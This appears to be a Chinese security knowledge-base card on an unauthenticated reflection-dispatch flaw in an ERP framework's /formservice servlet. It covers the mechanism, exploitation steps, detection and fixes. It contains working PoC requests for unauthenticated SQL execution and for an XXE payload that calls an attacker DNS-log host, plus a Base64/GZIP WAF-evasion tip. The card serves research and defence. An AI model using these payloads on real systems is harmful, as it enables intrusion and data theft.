---
id: web-java-framework-formservice-reflection-dispatch-unauth
title: FormService 反射分发未强制 isAccessible：service 参数可匿名调用服务类任意 public 方法
type: scenario
domain: web
path: web/java/framework
technique: formservice-reflection-dispatch-missing-authz
tags:
- java
- servlet
- reflection
- framework
- unauth
- auth-bypass
- formservice
- erp
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V237
  verified_at: '2026-11-07T09:20:25+08:00'
  notes: 已对照原文核对（33 图）；机制卡，PoC 为原文 workflow.sqlResult/richclient.openForm 请求；未复现。
url: /docs/web/java/framework/web-java-framework-formservice-reflection-dispatch-unauth/
draft: false
kb_aliases:
- FormService 反射调用
- service 参数反射分发
- plugins.xml 服务映射
- isAccessible 鉴权缺失
- ISecurityService
- com.artery.form.FormService
---

## 一句话结论

ERP 自研框架的 `com.artery.form.FormService` Servlet 用 `service` 参数解析出服务组与方法名，从 `plugins.xml` 取类名后反射调用任意 public 方法；只有实现了 `ISecurityService` 的类才会调用 `isAccessible` 做匿名校验，未实现该接口（或 `isAccessible` 为空实现）的服务类可被未登录用户直接调用，构成整个系统的未授权调用入口。

## 原理

- `FormService` 继承 `HttpServlet`，`service()` 中执行 `getService(request, request.getParameter("service"))` 并实例化返回的类。
- `getService` 的解析规则：
  - `service` 不含 `.`（如 `getForm`）时，默认使用 `FormServiceImpl`，方法名即参数值；
  - 含 `.`（如 `attachment.getAttachementItem`）时，`.` 前为服务组名，必须在 `pluginMap` 中存在；`.` 后为方法名；
  - `pluginMap` 来自 `Configuration.getPlugins("form-service","service")`，读取 classpath 下的 `/plugins.xml`，把 `<service name="xxx" class="全限定类名">` 映射成 name→class；
  - 反射 `serviceClass.getMethods()` 按方法名匹配 public 方法，方法参数必须为 2 个（request、response）或 3 个（request、response、内容参数）；3 个参数时第三个参数类型决定内容解析方式。
- 鉴权逻辑：`service()` 遍历服务类实现的接口，只有发现 `ISecurityService` 时才反射取 `isAccessible(HttpServletRequest, String)` 并调用；**非 `ISecurityService` 实现类完全跳过鉴权**。`isAccessible` 的标准实现是 `UserContext.checkAnonymous(request)`，校验匿名访问权限；空实现则等于放行。
- `PortalFilter` 只对 `*.form`、`*.prog`、`*.html`、`*.vhtml`、`*.jsp` 等后缀做登录校验，`/formservice` 没有任何受保护后缀，未登录请求直接到达 Servlet。
- 第三个参数（`content`）由请求参数 `content` 提供，按类型转换为：`Document`（SAXReader 解析 XML）、`String`、`JSONObject`、`JSONArray`、`InputStream`（Base64 解码）、JavaBean 等；`inflate=true` 时先 Base64 解码再 GZIP 解压。攻击者因此可以按目标方法签名构造任意参数内容。

## 触发条件

- 目标部署了该 ERP/自研框架，`/formservice` 可访问且不在登录过滤器保护的后缀内。
- 攻击者知道（或能从 JS/报错/源码泄露中获取）`plugins.xml` 中的服务名与类名，以及目标 public 方法名。
- 目标服务类未实现 `ISecurityService`，或实现了但 `isAccessible` 为空/未拦截匿名访问。
- 目标方法为 public，且参数为 (request, response) 或 (request, response, content)；方法内部存在危险操作（文件读写、SQL、XXE 等）。

## 利用步骤

1. 访问 `/formservice?service=...` 或用不存在的方法名触发异常，确认 Servlet 存在与服务名解析规则。
2. 收集服务名：从 `plugins.xml`、前端 JS、错误信息、源码泄露或已知 ERP 指纹中提取（如 `workflow`、`updater`、`bbsService`、`richclient`、`attachment`、`designer`）。
3. 按“服务组.方法名”形式调用；先用无副作用的查询方法验证可达性。
4. 判断第三个参数类型：String 直接放 `content=`；Document 放 XML；JSONObject 放 JSON；`inflate=true` 时放 Base64+GZIP。
5. 枚举并调用危险 public 方法，落到具体 sink（文件上传、任意文件读写、SQL 注入、XXE 等）。
6. 记录请求/响应与调用方法名，评估是否需要登录态（通常不需要）。

## PoC

```http
POST /formservice?service=workflow.sqlResult HTTP/1.1
Host: target
Content-Type: application/json

{"params":{"hello":"world"},"sql":"select @@version"}
```

```http
POST /formservice?service=richclient.openForm HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.dnslog.cn"> %remote;]>
<root/>
```

两个请求都无需登录即可到达服务类方法：前者执行 SQL，后者触发 XXE 外带。

## 变体与关联

- 变体：`service` 不带 `.` 时调用 `FormServiceImpl` 的 public 方法；`inflate=true` + Base64/GZIP 可绕过按明文关键字做的 WAF。
- 变体：`isAccessible` 存在但只检查部分方法名、或只在特定条件抛异常时，仍可能绕过。
- 关联：具体 sink 见 [[web-generic-file-upload-artery-erp-servletupload-phoneupload]]、[[web-generic-file-inclusion-artery-erp-formstudioupdater-getstudiofile]]、[[web-generic-file-upload-artery-erp-formstudioupdater-uploadstudiofile]]、[[web-generic-file-inclusion-artery-erp-loginservlet-errorpage-forward]]、[[web-generic-sqli-artery-erp-workflow-sqlresult-unauth]]、[[web-generic-xxe-artery-erp-richclient-openform]]；同类反射分发鉴权缺失见 [[web-java-framework-do-filter-reflection-dispatch]]。
- 边界：服务类全部实现 `ISecurityService` 且 `isAccessible` 正确拦截匿名访问；`plugins.xml` 不可获得且服务名无法枚举；`/formservice` 被额外过滤器强制登录时，未授权调用不成立。

## 检测与防御

- 检测：`/formservice?service=` 请求中出现不常见的服务组/方法名；同一 IP 枚举 service 值；`content` 中出现 `../`、SQL 关键字、XML DOCTYPE、`jsp:scriptlet`；401/500 错误率与正常业务偏差。
- 修复：给所有服务类强制实现统一的 `isAccessible` 校验，并在分发前做默认拒绝（未实现即拒绝，而不是默认放行）；服务方法使用白名单注册，禁止反射任意 public 方法。
- 加固：`/formservice` 统一加登录与角色校验；过滤/限制 `content` 中的路径穿越、SQL、XML 外部实体；隐藏或移除 `plugins.xml`；最小化服务类中的 public 危险方法。
- 审计要点：搜索 `getService(`、`Class.forName(pluginMap`、`getMethod("isAccessible"`、`getMethods()`、`invoke(`，以及 `ISecurityService` 的实现类与空 `isAccessible`。
